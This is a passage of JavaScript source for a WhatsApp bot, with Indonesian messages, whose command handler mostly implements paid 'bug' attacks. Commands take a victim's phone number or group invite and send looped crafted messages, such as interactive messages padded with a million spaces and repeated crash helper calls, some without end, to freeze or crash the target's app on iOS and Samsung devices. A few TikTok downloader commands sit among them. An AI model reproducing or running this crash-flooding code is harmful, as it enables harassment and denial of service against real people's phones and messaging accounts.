  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await afgan.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(3500)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'button-internal': case 'button-external': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`</> crash sudah terkirim... `)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await afgan.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰꒯ꏂ꒒꓄ꋬ ₵Ɽ₳₴Ⱨ Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #afganCrash"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await afgan.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(3500)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'enemygroup': case 'bug-hole': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`</> crash sudah terkirim... `)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰꒯ꏂ꒒꓄ꋬ ₵Ɽ₳₴Ⱨ Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #AfganCrash"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await afgan.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(4000)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'internal-group': case 'external-group': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`</> crash sudah terkirim... `)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰꒯ꏂ꒒꓄ꋬ ₵Ɽ₳₴Ⱨ Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #afganxcrash"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await afgan.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(3500)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case 'ios-unlimited': case 'ios-ui': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
await reply(`In proses....`)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(3200)
  }
}
break
//=================================================//
case 'ios-uicrash': case 'ios-infinity': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
reply(`In proses....`)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(3500)
}
reply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
case 'samsung-ui': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-internal': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-external': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-crash': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-reboot': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-bug': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'bug-quoted': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'onekill': case 'doublekill': case '💀': case 'triplekill': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'unlimited-bug': case '😈': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (;;) {
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await sleep(30000)
}
}
break
case 'devil-list': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await afgan.sendMessage(victim, { text: '' }, { quoted: xbug2 })
}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'notif-ui': case 'notif-crash': case 'crash-total': case '🔥': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "crash-myinter": {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(3000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(3500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case '🌷': case '💥': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case '⭐': case '⚡': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'ttmp3': {
const clean = (data) => {
  let regex = /(<([^>]+)>)/gi;
  data = data.replace(/(<br?\s?\/>)/gi, " \n");
  return data.replace(regex, "");
};

async function shortener(url) {
  return url;
}

async function Tiktok(query) {
  let response = await axios("https://lovetik.com/api/ajax/search", {
    method: "POST",
    data: new URLSearchParams(Object.entries({ query })),
  });

  let result = {};

  result.creator = "Tioxy";
  result.title = clean(response.data.desc);
  result.author = clean(response.data.author);
  result.nowm = await shortener(
    (response.data.links[0].a || "").replace("https", "http")
  );
  result.watermark = await shortener(
    (response.data.links[1].a || "").replace("https", "http")
  );
  result.audio = await shortener(
    (response.data.links[2].a || "").replace("https", "http")
  );
  result.thumbnail = await shortener(response.data.cover);
  return result;
}


let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vm.tiktok.com/ZSL7p9jRV/`
	if (!text) return m.reply(input)
reply(mess.wait)
  let res = await Tiktok(text)
  let cap = `乂 *T i k  T o k*\n♮ *Username:* ${res.author}\n♮ *Description:* ${res.title}
`
//let a = await afgan.sendFile(m.chat, res.thumbnail || emror, '', cap, m)
 
await afgan.sendMessage(m.chat, { 
    audio: { url: res.audio }, 
    mimetype: 'audio/mpeg', 
    fileName: `${res.title}.mp3`,
    ptt: false
  }, {quoted: m})
}
break
case 'ttdl': case 'tiktok': case 'tt': {
async function tiktok(url) {
    try {
        const data = new URLSearchParams({
            'id': url,
            'locale': 'id',
            'tt': 'RFBiZ3Bi'
        });

        const headers = {
            'HX-Request': true,
            'HX-Trigger': '_gcaptcha_pt',
            'HX-Target': 'target',
            'HX-Current-URL': 'https://ssstik.io/id',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
            'Referer': 'https://ssstik.io/id'
        };

        const response = await axios.post('https://ssstik.io/abc?url=dl', data, {
            headers
        });
        const html = response.data;

        const $ = cheerio.load(html);

        const author = $('#avatarAndTextUsual h2').text().trim();
        const title = $('#avatarAndTextUsual p').text().trim();
        const video = $('.result_overlay_buttons a.download_link').attr('href');
        const audio = $('.result_overlay_buttons a.download_link.music').attr('href');
        const imgLinks = [];
        $('img[data-splide-lazy]').each((index, element) => {
            const imgLink = $(element).attr('data-splide-lazy');
            imgLinks.push(imgLink);
        });

        const result = {
            isSlide: video ? false : true,
            author,
            title,
            result: video || imgLinks,
            audio
        };
        return result
    } catch (error) {
        console.error('Error:', error);
        return null;
    }
}
 

//if (!isRegistered) return registerbut(noregis)
    let input = `[!] *𝙴𝚛𝚘𝚛 𝙸𝚗𝚙𝚞𝚝*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFm1R2yK/`

    if (!text) return m.reply(input)

    if (!(text.includes('http://') || text.includes('https://'))) return reply(`𝙻𝙸𝙽𝙺 𝚒𝚗𝚟𝚊𝚕𝚒𝚍, 𝚙𝚕𝚎𝚊𝚜𝚎 𝚒𝚗𝚙𝚞𝚝 𝚊 𝚟𝚊𝚕𝚒𝚍 𝙻𝙸𝙽𝙺,\n𝚃𝚛𝚢 𝚠𝚒𝚝𝚑 *𝐡𝐭𝐭𝐩𝐬://* 𝚘𝚛 *𝐡𝐭𝐭𝐩𝐬://*`)
    if (!text.includes('tiktok.com')) return reply(`𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐋𝐈𝐍𝐊.`)

    const {
        isSlide,
        result,
        title,
        author
    } = await tiktok(text);
    let no = 1

    if (isSlide == true) {
        await reply(mess.wait)
        let cap = `👋 *Tiktok Image*\n\n`
        let no = 1
        for (let img of result) {
        
afgan.sendMessage(m.chat, { caption:  `${cap} ﻿${no++}`, image: { url: img }}, {quoted: m});
        // await afgan.sendFile(m.sender, img, '', `${cap}*【﻿${no++}】*`, null)
            await delay(2000)
        }
    } else if (isSlide == false) {
        await reply(mess.wait)
        let vd = `Caption : *${title}*

 Caption : ${author}`
//await afgan.sendMessage(m.chat, { caption: title, video: { url: result }}, {quoted: m});
const heho = [
                {
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: "Audio 🎧",
      id: `.ttmp3 ${text}`
   })
}
]

// button text
afgan.sendButtonVideo(m.chat, heho, m, {
   video: result,
   body: '',
   footer: global.namabot
})
    }
}
break
case 'bot': {
reply('bot on kak, silahkan ketik *.menu*')
}
break
case 'sipilist': case '1hit': case 'brutal': case '1shoot': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 628995645747`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628995645747`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await sleep(50000)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
